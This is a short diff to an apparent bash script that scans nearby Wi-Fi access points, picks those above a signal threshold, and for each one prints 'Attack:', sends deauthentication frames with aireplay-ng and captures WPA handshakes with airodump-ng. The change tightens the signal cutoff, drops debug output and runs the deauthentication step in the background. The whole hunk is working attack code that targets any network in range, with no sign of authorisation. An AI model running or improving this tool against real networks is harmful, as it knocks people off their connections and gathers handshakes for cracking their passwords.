@@ -97,16 +97,14 @@ active() {
           if [[ $BSSID == "BSSID" ]];then
                   continue
           fi
-          echo $BestQuality $ESSID $BSSID $Channel
-          if [[ $BestQuality -lt -70 ]]
+          if [[ $BestQuality -lt -65 ]]
           then
-                  echo $ESSID $BSSID $BestQuality
                   continue
           fi
       
           printf "Attack: $BSSID \nChannel: $Channel \nPower: $BestQuality\nSSID: $ESSID\n"
           iwconfig $interface channel $Channel
-          aireplay-ng -a $BSSID -0 5 $interface
+          aireplay-ng -a $BSSID -0 5 $interface &
           timeout 30 airodump-ng --bssid $BSSID --channel $Channel -w /home/kali/hscollector/shakes $interface &> /dev/null 
          
           checkHandshakes
